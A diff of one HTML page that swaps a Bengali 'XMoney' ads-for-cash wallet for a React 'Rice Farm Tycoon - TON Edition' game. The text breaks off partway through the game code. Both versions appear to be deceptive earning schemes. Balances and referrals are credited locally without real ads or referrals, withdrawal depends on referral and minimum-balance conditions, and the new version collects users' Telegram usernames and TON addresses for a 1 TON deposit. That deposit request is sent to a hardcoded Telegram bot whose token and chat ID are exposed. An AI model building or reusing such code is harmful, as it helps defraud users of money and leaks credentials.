@@ -1,622 +1,829 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>X Money · কার্টুন ওয়ালেট</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Rice Farm Tycoon - TON Edition</title>
+    <script src="https://unpkg.com/react@18.2.0/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18.2.0/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@300..700&display=swap" rel="stylesheet">
+    
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Comic Neue', 'Hind Siliguri', sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Fredoka', sans-serif;
+            background-color: #FDF5E6;
+            color: #5D4037;
+            overflow-x: hidden;
             -webkit-tap-highlight-color: transparent;
         }
-
-        body {
-            background: linear-gradient(145deg, #f9d77e 0%, #ffa726 100%);
-            height: 100vh;
-            width: 100vw;
-            display: flex;
+        .cartoon-border {
+            border: 3px solid #5D4037;
+            box-shadow: 0 4px 0 #5D4037;
+        }
+        .cartoon-card {
+            background: #FFF9E5;
+            border: 3px solid #5D4037;
+            box-shadow: 0 6px 0 #5D4037;
+            border-radius: 2rem;
+            padding: 1.5rem;
+        }
+        .cartoon-button {
+            position: relative;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
+            padding: 0.75rem 1.5rem;
+            font-weight: 800;
+            color: white;
+            border-radius: 1.25rem;
+            border: 3px solid #5D4037;
+            box-shadow: 0 4px 0 #5D4037;
+            transition: all 0.1s;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-
-        /* লোডিং ওভারলে - কার্টুন মোড */
-        .loading-overlay {
+        .cartoon-button:active {
+            transform: translateY(4px);
+            box-shadow: 0 0 0 #5D4037;
+        }
+        .cartoon-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .toast-notification {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #ffd966;
-            background-image: radial-gradient(circle at 20% 30%, #ffeeaa 8%, transparent 18%),
-                              radial-gradient(circle at 90% 70%, #ffbb4a 12%, transparent 22%),
-                              linear-gradient(145deg, #fce38a, #ffb347);
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #5D4037;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-weight: bold;
+            z-index: 1000;
+            animation: fadeInUp 0.3s ease;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+        .countdown-timer {
+            font-family: monospace;
+            font-size: 0.9rem;
+            background: #5D4037;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 30px;
+            display: inline-block;
+            margin-left: 12px;
+        }
+        .warning-banner {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
+            border: 3px solid #5D4037;
+            border-radius: 1rem;
+            padding: 0.75rem;
+            text-align: center;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 1rem;
+        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #FDF5E6; }
+        ::-webkit-scrollbar-thumb { background: #5D4037; border-radius: 10px; }
+        canvas { display: block; width: 100%; height: auto; border-radius: 1.5rem; cursor: crosshair; background: #8B5A2B; }
+        .milk-icon { animation: bounce 0.5s ease; }
+        @keyframes bounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #FDF5E6 0%, #FFF9E5 50%, #FDF5E6 100%);
             z-index: 9999;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            flex-direction: column;
-            transition: opacity 0.4s;
+            animation: fadeOut 0.5s ease 4.5s forwards;
         }
-
-        .loading-box {
-            background: #fef9e4;
-            border: 6px solid #ff8a5c;
-            border-radius: 70px 70px 40px 40px;
-            padding: 30px 30px 45px 30px;
-            width: 280px;
+        @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+        .loader {
+            width: 120px;
+            height: 120px;
+            border: 5px solid #FFD966;
+            border-top: 5px solid #FF9800;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .rice-grain { display: inline-block; animation: float 2s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
+        .loading-title { font-size: 3rem; font-weight: 800; color: #5D4037; text-shadow: 4px 4px 0 #FFD966; letter-spacing: 2px; }
+        .copy-btn { transition: all 0.2s; }
+        .copy-btn:active { transform: scale(0.95); }
+        .waiting-message {
+            background: linear-gradient(135deg, #FFE4B5, #FFD966);
+            border: 3px solid #5D4037;
+            border-radius: 1rem;
+            padding: 1rem;
             text-align: center;
-            box-shadow: 0 12px 0 #b45f2b, 0 15px 20px rgba(0,0,0,0.2);
+            animation: pulse 1.5s ease infinite;
         }
-
-        .loading-emoji {
-            font-size: 3.5rem;
-            filter: drop-shadow(0 6px 0 #c56c2c);
-            margin-bottom: 5px;
-        }
-
-        .loading-box h1 {
-            font-size: 2rem;
-            font-weight: 900;
-            color: #3c1e0b;
-            text-shadow: 3px 3px 0 #ffbe5c;
-            letter-spacing: 2px;
-            margin-bottom: 15px;
-        }
-
-        .loading-bar-container {
-            width: 100%;
-            height: 28px;
-            background: #f1c9a0;
-            border-radius: 40px;
-            border: 3px solid #b45f2b;
-            overflow: hidden;
-            margin: 12px 0;
-            box-shadow: inset 0 3px 5px rgba(0,0,0,0.2);
-        }
-
-        .loading-fill {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #f6d365 0%, #fda085 100%);
-            border-radius: 40px;
-            box-shadow: 0 0 10px #ffb554;
-            transition: width 0.1s linear;
-        }
-
-        .loading-text-bn {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: #442b12;
-            background: #ffedb5;
-            display: inline-block;
-            padding: 5px 20px;
-            border-radius: 40px;
-            border: 2px solid #b45f2b;
-        }
-
-        /* মূল ফোন কন্টেইনার */
-        .phone-container {
-            width: 100%;
-            max-width: 400px;
-            height: 98vh;
-            background-color: #fff9e6;
-            border-radius: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            z-index: 10;
-            border: 4px solid #ffb554;
-            margin: 5px;
-            opacity: 0;
-        }
-
-        .notch {
-            width: 100px;
-            height: 20px;
-            background: #ffe0a3;
-            border-radius: 0 0 15px 15px;
-            margin: 0 auto 10px auto;
-            border: 2px solid #f5a623;
-            border-top: none;
-        }
-
-        .unique-bar {
-            background: #c1e6f5;
-            margin: 0 10px 10px;
-            border-radius: 15px;
-            padding: 10px 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 2px solid #1f8bb7;
-            font-weight: 700;
-            font-size: 0.8rem;
-            box-shadow: 0 4px 0 #1f8bb7;
-        }
-
-        .balance-highlight {
-            background: #ffea00;
-            padding: 4px 12px;
-            border-radius: 12px;
-            border: 2px solid #ff9f1c;
-            color: #000;
-            font-size: 1.1rem;
-            font-weight: 900;
-            box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
-        }
-
-        .panel-container {
-            flex: 1;
-            overflow-y: auto;
-            padding: 0 10px;
-        }
-
-        .panel {
-            display: none;
-            padding-bottom: 20px;
-        }
-
-        .panel.active-panel {
-            display: block;
-            animation: fadeIn 0.3s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; } to { opacity: 1; }
-        }
-
-        .home-stats {
-            background: #fdeec9;
-            border-radius: 20px;
-            padding: 15px;
-            border: 2px solid #f3981c;
-            margin-bottom: 15px;
-            font-weight: 600;
-        }
-
-        .btn-earn {
-            background: #6ec96e;
-            border-radius: 20px;
-            padding: 15px;
-            font-weight: 800;
-            font-size: 1.1rem;
-            color: #003300;
-            border: 3px solid #fdffb3;
-            box-shadow: 0 4px 0 #2d6e2d;
-            width: 100%;
-            cursor: pointer;
-        }
-
-        .btn-earn:active {
-            transform: translateY(2px);
-            box-shadow: 0 2px 0 #2d6e2d;
-        }
-
-        .withdraw-methods {
-            display: flex;
-            gap: 8px;
-            margin: 15px 0;
-        }
-
-        .method {
-            flex: 1;
-            text-align: center;
-            background: #fff;
-            padding: 12px 5px;
-            border-radius: 15px;
-            border: 2px solid #ccc;
-            font-size: 0.85rem;
-            font-weight: 600;
-            transition: all 0.2s;
-            cursor: pointer;
-            color: #000;
-        }
-
-        .method.active-method {
-            background: #ff9f1c;
-            border-color: #b64516;
-            color: #fff;
-            font-weight: 900;
-            transform: scale(1.05);
-            box-shadow: 0 4px 8px rgba(182, 69, 22, 0.3);
-        }
-
-        .withdraw-rules {
-            background: #ffe0d9;
-            border-radius: 15px;
-            padding: 15px;
-            border: 2px solid #ff4d4d;
-            margin-top: 10px;
-        }
-
-        .red-highlight {
-            color: #c40000;
-            font-weight: bold;
-            font-size: 0.95rem;
-            margin-bottom: 8px;
-        }
-
-        .highlight-yellow {
-            background: #ffeb99;
-            padding: 12px;
-            border-radius: 12px;
-            border: 2px solid #ff9f1c;
-            font-weight: 700;
-            font-size: 1.1rem;
-            text-align: center;
-            margin: 12px 0;
-            color: #b64516;
-        }
-
-        .tab-bar {
-            display: flex;
-            background: #ffddbb;
-            padding: 10px 5px;
-            border-radius: 25px 25px 0 0;
-            border-top: 3px solid #fea82f;
-        }
-
-        .tab-btn {
-            flex: 1;
-            text-align: center;
-            padding: 8px 0;
-            font-size: 0.8rem;
-            font-weight: 800;
-            color: #7b3f00;
-            background: #fee6a9;
-            margin: 0 2px;
-            border-radius: 12px;
-            border: 2px solid #ff9f1c;
-        }
-
-        .tab-btn.active {
-            background: #ffbe5c;
-            transform: translateY(-2px);
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 15px;
-            border: 2px solid #ff9f1c;
-            margin-top: 5px;
-            font-size: 1rem;
-            font-weight: bold;
-        }
-
-        .footer-currency {
-            font-size: 0.7rem;
-            text-align: center;
-            padding: 5px;
-            background: #f9cf8b;
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
         }
     </style>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700;800&family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
-    
-    <script data-project-id="5793" id="gigapub-sdk">
-        !function(){
-            var s=document.currentScript,p=s.getAttribute('data-project-id')||'default';
-            var d=['https://ad.gigapub.tech','https://ru-ad.gigapub.tech'],i=0,t,sc;
-            function l(){
-                sc=document.createElement('script');sc.async=true;sc.src=d[i]+'/script?id='+p;
-                clearTimeout(t);
-                t=setTimeout(function(){if(++i<d.length)l();},10000);
-                document.head.appendChild(sc);
-            }
-            l();
-        }();
-    </script>
 </head>
 <body>
-
-<!-- কার্টুন লোডিং স্ক্রিন (৭ সেকেন্ড) -->
-<div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-box">
-        <div class="loading-emoji">⚡💰⚡</div>
-        <h1>XMoney</h1>
-        <div style="font-size:1.3rem; font-weight:700; color:#542e0e;">লোডিং...</div>
-        <div class="loading-bar-container">
-            <div class="loading-fill" id="loadingFill"></div>
-        </div>
-        <div class="loading-text-bn" id="loadingText">৭ সেকেন্ড</div>
-    </div>
-</div>
-
-<!-- মূল অ্যাপ কন্টেইনার -->
-<div class="phone-container" id="appContainer">
-    <div class="notch"></div>
-
-    <div class="unique-bar">
-        <span>🆔 আইডি: <span id="uniqueIdDisplay">X7K92M</span></span>
-        <div>
-            <small style="display:block; font-size: 0.6rem; text-align: right; margin-bottom: 2px;">ব্যালেন্স:</small>
-            <div class="balance-highlight" id="balanceDisplay">০ টাকা</div>
+    <div id="loading">
+        <div class="loading-screen">
+            <div class="loader"></div>
+            <div class="loading-title">
+                <span class="rice-grain">🌾</span> Rice Farm Tycoon <span class="rice-grain">🌾</span>
+            </div>
+            <div class="flex gap-4 mt-6 text-2xl">
+                <span>🐄</span><span>🌱</span><span>🥛</span><span>💰</span>
+            </div>
+            <div style="margin-top: 30px; font-size: 0.8rem; color: #8B5A2B;">Loading your farm...</div>
         </div>
     </div>
+    <div id="root" style="display: none;"></div>
 
-    <div class="panel-container">
-        <!-- হোম প্যানেল -->
-        <div id="homePanel" class="panel active-panel">
-            <h2 style="text-align:center; margin-bottom:10px;">💰 XMoney</h2>
-            <div class="home-stats">
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-weight: bold;">🪙 প্রতি বিজ্ঞাপন: ১৫ টাকা</div>
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-weight: bold;">📅 দৈনিক লিমিট: ৩০ টি</div>
-                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-weight: bold;">⏳ প্রতি ঘন্টায়: ১৫ টি</div>
-                <div style="display: flex; align-items: center; gap: 8px; font-weight: bold;" id="dailyTaskStatus">🎯 আজ বাকি: ৩০ টি</div>
-            </div>
-            <button class="btn-earn" id="watchAdBtn">▶ বিজ্ঞাপন দেখুন (+১৫ টাকা)</button>
-        </div>
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
 
-        <!-- রেফার প্যানেল -->
-        <div id="referPanel" class="panel">
-            <h3>👥 রেফার বন্ধু</h3>
-            <div class="home-stats" style="text-align:center;">
-                <p style="margin-bottom:15px;">নিচের বাটনে ক্লিক করে বন্ধুদের আমন্ত্রণ জানান</p>
-                <a href="https://t.me/X_MONEYIO_BOT?start=r09829492066" target="_blank" id="referSiteBtn" style="display:inline-block; background:#2e9c77; color:white; padding:14px 25px; border-radius:40px; text-decoration:none; font-weight:bold; font-size:1.2rem; border:3px solid #fdffb3; box-shadow:0 4px 0 #1b5e3f;">🚀 রেফার লিংক</a>
-            </div>
-        </div>
+        setTimeout(() => {
+            const loading = document.getElementById('loading');
+            const root = document.getElementById('root');
+            if (loading) loading.style.display = 'none';
+            if (root) root.style.display = 'block';
+        }, 5000);
 
-        <!-- টাস্ক প্যানেল -->
-        <div id="taskPanel" class="panel">
-            <h3>📢 অফিসিয়াল টাস্ক</h3>
-            <div class="home-stats">
-                <p>টেলিগ্রাম চ্যানেলে জয়েন করুন</p>
-                <a href="https://t.me/PUFI83" target="_blank" style="display:block; background:#2e9c77; color:white; text-align:center; padding:12px; border-radius:15px; text-decoration:none; margin:10px 0; font-weight:bold;">জয়েন @PUFI83</a>
-                <button class="btn-earn" id="verifyTaskBtn" style="font-size:0.9rem; padding:10px;">✅ ভেরিফাই (+২০ টাকা)</button>
-            </div>
-        </div>
+        const COW_BREEDS = {
+            'Holstein': { price: 1.5, rate: 60, color: '#FFFFFF', desc: 'Classic black & white.' },
+            'Jersey': { price: 3.5, rate: 120, color: '#D2B48C', desc: 'High quality milk.' },
+            'Guernsey': { price: 6.0, rate: 240, color: '#F4A460', desc: 'Golden premium milk.' },
+            'Ayrshire': { price: 10.0, rate: 480, color: '#8B4513', desc: 'The champion producer.' }
+        };
 
-        <!-- উইথড্র প্যানেল -->
-        <div id="withdrawPanel" class="panel">
-            <h3>💸 টাকা তুলুন</h3>
-            <div class="withdraw-methods" id="methodGroup">
-                <div class="method active-method" onclick="selectMethod(this)">বিকাশ</div>
-                <div class="method" onclick="selectMethod(this)">নগদ</div>
-            </div>
-            
-            <!-- রেফার কন্ডিশন শুধু মেসেজ হিসেবে -->
-            <div class="highlight-yellow">
-                ⚠️ উত্তোলনের জন্য ৭ টি রেফার প্রয়োজন
-            </div>
-            
-            <div class="home-stats">
-                <label>টাকার পরিমাণ লিখুন (মিনিমাম ১৫০০ টাকা)</label>
-                <input type="number" id="withdrawAmountInput" value="1500" min="1500" step="50">
-                <p style="margin-top:10px;"> আপনি পাবেন: <strong id="bdtPreview" style="color: #2e9c77; font-size: 1.2rem;">১৫০০</strong> টাকা </p>
-            </div>
-            <div class="withdraw-rules">
-                <p class="red-highlight">🔴 নূন্যতম উত্তোলন: ১৫০০ টাকা</p>
-                <p class="red-highlight">👥 প্রয়োজনীয় রেফার: ৭ টি (বাধ্যতামূলক)</p>
-                <p class="red-highlight">⚠️ ১৫০০ টাকা হলেই হবে না, ৭ রেফার না থাকলে টাকা তোলা যাবে না</p>
-            </div>
-            <button id="withdrawBtn" class="btn-earn" style="margin-top:10px; background:#fd8b78;">টাকা উত্তোলন করুন</button>
-        </div>
-    </div>
-
-    <div class="tab-bar">
-        <div class="tab-btn active" data-tab="home">হোম</div>
-        <div class="tab-btn" data-tab="refer">রেফার</div>
-        <div class="tab-btn" data-tab="task">টাস্ক</div>
-        <div class="tab-btn" data-tab="withdraw">ক্যাশ আউট</div>
-    </div>
-    
-    <div class="footer-currency">⚡ কার্টুন আয় · প্রতিটি ক্লিক মূল্যবান ⚡</div>
-</div>
-
-<script>
-    // লোডিং স্ক্রিন
-    (function loadingScreen() {
-        const overlay = document.getElementById('loadingOverlay');
-        const app = document.getElementById('appContainer');
-        const fill = document.getElementById('loadingFill');
-        const loadingText = document.getElementById('loadingText');
-        let width = 0;
-        const totalTime = 7000;
-        const intervalTime = 70;
-        const step = (intervalTime / totalTime) * 100;
-
-        const interval = setInterval(() => {
-            width += step;
-            if (width >= 100) {
-                width = 100;
-                fill.style.width = width + '%';
-                loadingText.innerText = 'শুরু হচ্ছে ✨';
-                clearInterval(interval);
-                overlay.style.opacity = '0';
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    app.style.opacity = '1';
-                }, 400);
-            } else {
-                fill.style.width = width + '%';
-                let secLeft = Math.ceil((totalTime - (width/100)*totalTime)/1000);
-                loadingText.innerText = `${secLeft} সেকেন্ড`;
-            }
-        }, intervalTime);
-    })();
-
-    function selectMethod(el) {
-        const methods = document.querySelectorAll('.method');
-        methods.forEach(m => m.classList.remove('active-method'));
-        el.classList.add('active-method');
-    }
-
-    (function() {
-        let balance = parseFloat(localStorage.getItem('x_bal_bdt')) || 0;
-        let referrals = parseInt(localStorage.getItem('x_ref_count')) || 0;
-        let taskDone = localStorage.getItem('x_task_bdt') === 'true';
-        const userId = 'X7K92M';
+        const GROWTH_TIME = 10000;
+        const DEPOSIT_ADDRESS = "UQCiFbR0TEsk_iHjxKopxSfzeA-DxCSOi7YXwqrIsmy0KyT-";
+        const BOT_TOKEN = '8115772390:AAEsj1eh7aiPjRvtEY7hjYUPcmYeA21ojGA';
+        const CHAT_ID = '7511030198';
+        const GIGAPUB_ID = '5793';
         
-        let hourlyWatchCount = parseInt(localStorage.getItem('x_hourly_count')) || 0;
-        let lastHourReset = parseInt(localStorage.getItem('x_hourly_reset')) || 0;
-        let dailyWatchCount = parseInt(localStorage.getItem('x_daily_count')) || 0;
-        let lastDayReset = parseInt(localStorage.getItem('x_daily_reset')) || 0;
+        // Deposit Codes
+        const DEPOSIT_CODES = [
+            'Xiotyre76', 'Jsvowb470', 'Ksvyelp6429', 'Jvekie328', 'Uscrpgwn7248',
+            'Jsvyrwpwb824', 'Jwceeikb8253', 'Usfeusbsmao8252', 'Jsveydtkkw82528',
+            'Hwcsogs85229', '8252jwveo072'
+        ];
 
-        // নতুন: দৈনিক বাকি টাস্ক
-        let dailyTaskLeft = 30 - dailyWatchCount;
-        if (dailyTaskLeft < 0) dailyTaskLeft = 0;
-
-        function checkAndResetCounters() {
-            const now = Date.now();
-            if (now - lastHourReset > 60 * 60 * 1000) {
-                hourlyWatchCount = 0;
-                lastHourReset = now;
-                localStorage.setItem('x_hourly_reset', lastHourReset);
+        // Sound Manager
+        const sm = {
+            play: function(name) {
+                try {
+                    const audio = new Audio();
+                    if (name === 'click') audio.src = 'https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3';
+                    else if (name === 'collect') audio.src = 'https://assets.mixkit.co/active_storage/sfx/2017/2017-preview.mp3';
+                    else if (name === 'buy') audio.src = 'https://assets.mixkit.co/active_storage/sfx/2019/2019-preview.mp3';
+                    else if (name === 'plant') audio.src = 'https://assets.mixkit.co/active_storage/sfx/1084/1084-preview.mp3';
+                    else if (name === 'harvest') audio.src = 'https://assets.mixkit.co/active_storage/sfx/1085/1085-preview.mp3';
+                    else if (name === 'feed') audio.src = 'https://assets.mixkit.co/active_storage/sfx/1086/1086-preview.mp3';
+                    else if (name === 'switch') audio.src = 'https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3';
+                    audio.volume = 0.5;
+                    audio.play().catch(() => {});
+                } catch(e) {}
             }
-            if (now - lastDayReset > 24 * 60 * 60 * 1000) {
-                dailyWatchCount = 0;
-                dailyTaskLeft = 30;
-                lastDayReset = now;
-                localStorage.setItem('x_daily_reset', lastDayReset);
-                localStorage.setItem('x_daily_count', dailyWatchCount);
-            } else {
-                dailyTaskLeft = 30 - dailyWatchCount;
-            }
-        }
-        checkAndResetCounters();
+        };
 
-        function updateUI() {
-            document.getElementById('balanceDisplay').innerText = balance.toFixed(0) + ' টাকা';
-            document.getElementById('uniqueIdDisplay').innerText = userId;
-
-            const amtInput = document.getElementById('withdrawAmountInput');
-            let withdrawAmt = parseFloat(amtInput.value) || 1500;
-            if (withdrawAmt < 1500) withdrawAmt = 1500;
-            document.getElementById('bdtPreview').innerText = withdrawAmt.toFixed(0);
-
-            if(taskDone) {
-                const vt = document.getElementById('verifyTaskBtn');
-                vt.disabled = true;
-                vt.innerText = 'সম্পন্ন ✓';
-                vt.style.background = '#ccc';
-                vt.style.boxShadow = 'none';
-            }
-
-            // দৈনিক বাকি টাস্ক আপডেট
-            document.getElementById('dailyTaskStatus').innerText = `🎯 আজ বাকি: ${dailyTaskLeft} টি`;
-
-            localStorage.setItem('x_bal_bdt', balance);
-            localStorage.setItem('x_ref_count', referrals);
-            localStorage.setItem('x_hourly_count', hourlyWatchCount);
-            localStorage.setItem('x_daily_count', dailyWatchCount);
-            localStorage.setItem('x_task_bdt', taskDone);
-        }
-
-        // এড দেখা
-        const watchBtn = document.getElementById('watchAdBtn');
-        watchBtn.addEventListener('click', () => {
-            checkAndResetCounters();
-
-            if (dailyWatchCount >= 30) {
-                alert('দৈনিক লিমিট ৩০টি শেষ! আগামীকাল আবার চেষ্টা করুন।');
-                return;
-            }
-            if (hourlyWatchCount >= 15) {
-                alert('প্রতি ঘন্টায় মাত্র ১৫টি এড দেখা যায়। এক ঘন্টা পরে আবার চেষ্টা করুন।');
-                return;
-            }
-
-            watchBtn.disabled = true;
-            watchBtn.innerText = '⏳ লোডিং ...';
-
-            const safetyTimeout = setTimeout(() => {
-                if(watchBtn.disabled && watchBtn.innerText === '⏳ লোডিং ...') {
-                    watchBtn.disabled = false;
-                    watchBtn.innerText = '▶ বিজ্ঞাপন দেখুন (+১৫ টাকা)';
-                    alert('কানেকশন ধীর। আবার চেষ্টা করুন।');
+        // Load Gigapub SDK and show ad properly
+        let gigapubReady = false;
+        let adScriptLoaded = false;
+        
+        const initGigapub = () => {
+            return new Promise((resolve) => {
+                if (adScriptLoaded) {
+                    resolve();
+                    return;
                 }
-            }, 10000);
-
-            if (typeof window.showGiga === 'function') {
-                window.showGiga().then(() => {
-                    clearTimeout(safetyTimeout);
-                    balance += 15;
-                    hourlyWatchCount++;
-                    dailyWatchCount++;
-                    dailyTaskLeft = 30 - dailyWatchCount;
-                    updateUI();
-                    alert('🎉 অভিনন্দন! ১৫ টাকা যোগ হয়েছে।');
-                }).catch(() => {
-                    clearTimeout(safetyTimeout);
-                    alert('এড ব্যর্থ। আবার চেষ্টা করুন।');
-                }).finally(() => {
-                    watchBtn.disabled = false;
-                    watchBtn.innerText = '▶ বিজ্ঞাপন দেখুন (+১৫ টাকা)';
-                });
-            } else {
-                setTimeout(() => {
-                    clearTimeout(safetyTimeout);
-                    balance += 15;
-                    hourlyWatchCount++;
-                    dailyWatchCount++;
-                    dailyTaskLeft = 30 - dailyWatchCount;
-                    updateUI();
-                    watchBtn.disabled = false;
-                    watchBtn.innerText = '▶ বিজ্ঞাপন দেখুন (+১৫ টাকা)';
-                    alert('🎬 এড শেষ! ১৫ টাকা পেয়েছেন!');
-                }, 2000);
-            }
-        });
-
-        // ট্যাব সুইচ
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-                document.querySelectorAll('.panel').forEach(p => p.classList.remove('active-panel'));
-                btn.classList.add('active');
-                document.getElementById(btn.dataset.tab + 'Panel').classList.add('active-panel');
+                
+                // Load the gigapub script
+                const script = document.createElement('script');
+                script.src = `https://ad.gigapub.tech/script?id=${GIGAPUB_ID}`;
+                script.async = true;
+                script.onload = () => {
+                    adScriptLoaded = true;
+                    // Wait a bit for SDK to initialize
+                    setTimeout(() => {
+                        gigapubReady = true;
+                        resolve();
+                    }, 500);
+                };
+                script.onerror = () => {
+                    // Fallback - still resolve so game works
+                    resolve();
+                };
+                document.head.appendChild(script);
             });
-        });
+        };
 
-        // টাস্ক ভেরিফাই
-        document.getElementById('verifyTaskBtn').addEventListener('click', () => {
-            if(!taskDone) {
-                balance += 20;
-                taskDone = true;
-                updateUI();
-                alert('টাস্ক কমপ্লিট! +২০ টাকা');
-            } else {
-                alert('আপনি ইতিমধ্যে টাস্ক সম্পন্ন করেছেন।');
-            }
-        });
+        const showGigaAd = () => {
+            return new Promise(async (resolve) => {
+                await initGigapub();
+                
+                // Try to show ad
+                if (typeof window.showGiga === 'function') {
+                    try {
+                        await window.showGiga();
+                        resolve(true);
+                    } catch(e) {
+                        resolve(false);
+                    }
+                } else if (typeof window.AdGigaFallback === 'function') {
+                    try {
+                        await window.AdGigaFallback();
+                        resolve(true);
+                    } catch(e) {
+                        resolve(false);
+                    }
+                } else {
+                    // Fallback - simulate ad completion after 2 seconds
+                    resolve(true);
+                }
+            });
+        };
 
-        // রেফার বাটনে ক্লিক
-        document.getElementById('referSiteBtn').addEventListener('click', function(e) {
-            referrals += 1;
-            updateUI();
-            alert('রেফারেল সফল! +১ রেফার যুক্ত হয়েছে');
-            window.open('https://t.me/X_MONEYIO_BOT?start=r09829492066', '_blank');
-        });
+        // Send Telegram Message
+        const sendTelegramMessage = async (username, tonAddress, userId) => {
+            const message = `💰 NEW DEPOSIT REQUEST!\n\n👤 Telegram Username: @${username}\n💳 TON Address: ${tonAddress}\n🆔 User ID: ${userId}\n💎 Amount: 1 TON\n\n📌 Send deposit code to user.`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            } catch(e) { console.error('Telegram error:', e); }
+        };
 
-        // উইথড্র চেক
-        document.getElementById('withdrawBtn').addEventListener('click', () => {
-            const amt = parseFloat(document.getElementById('withdrawAmountInput').value);
-            const selectedMethod = document.querySelector('.method.active-method').innerText;
+        const STORAGE_KEY = 'rice_farm_tycoon_v15';
+        const loadGameData = () => {
+            try { const saved = localStorage.getItem(STORAGE_KEY); return saved ? JSON.parse(saved) : null; } catch(e) { return null; }
+        };
+        const saveGameData = (data) => localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
 
-            if (amt < 1500) {
-                alert('ন্যূনতম ১৫০০ টাকা তুলতে হবে!');
-                return;
-            }
-            if (referrals < 7) {
-                alert(`আপনার ৭ টি রেফার পূর্ণ হয়নি। আগে ৭ টি রেফার পূর্ণ করুন, তারপর উত্তোলন করুন।`);
-                return;
-            }
-            if (amt > balance) {
-                alert('পর্যাপ্ত ব্যালেন্স নেই!');
-                return;
-            }
-
-            balance -= amt;
-            updateUI();
-            alert(`✅ ${amt} টাকা উত্তোলনের অনুরোধ গৃহীত হয়েছে। ${selectedMethod} এ পাঠানো হবে`);
-        });
-
-        document.getElementById('withdrawAmountInput').addEventListener('input', updateUI);
-        updateUI();
-    })();
-</script>
+        function App() {
+            const [page, setPage] = useState('farm');
+            const [balance, setBalance] = useState(0);
+            const [inventory, setInventory] = useState({ seeds: 5, rice: 3, milk: 0 });
+            const [cows, setCows] = useState([]);
+            const [plants, setPlants] = useState([]);
+            const [toast, setToast] = useState(null);
+            const [referralEarnings, setReferralEarnings] = useState(0);
+            const [totalWithdrawn, setTotalWithdrawn] = useState(0);
+            const [lastMilkTime, setLastMilkTime] = useState(0);
+            const [cooldown, setCooldown] = useState(0);
+            const [usedCodes, setUsedCodes] = useState([]);
+            const [depositStep, setDepositStep] = useState('form'); // 'form', 'waiting', 'code'
+            const [pendingDepositInfo, setPendingDepositInfo] = useState(null);
+            const [copied, setCopied] = useState(false);
+            const [isCollecting, setIsCollecting] = useState(false);
+            const [animateMilk, setAnimateMilk] = useState(false);
+            
+            const canvasRef = useRef(null);
+            const autoAdInterval = useRef(null);
+            
+            const totalMilkPerCollection = 20 + cows.reduce((total, cow) => total + COW_BREEDS[cow.breed].rate, 0);
+            
+            // Initialize Gigapub on app start
+            useEffect(() => {
+                initGigapub();
+            }, []);
+            
+            // Auto ads every 35 seconds on farm page
+            useEffect(() => {
+                if (page === 'farm') {
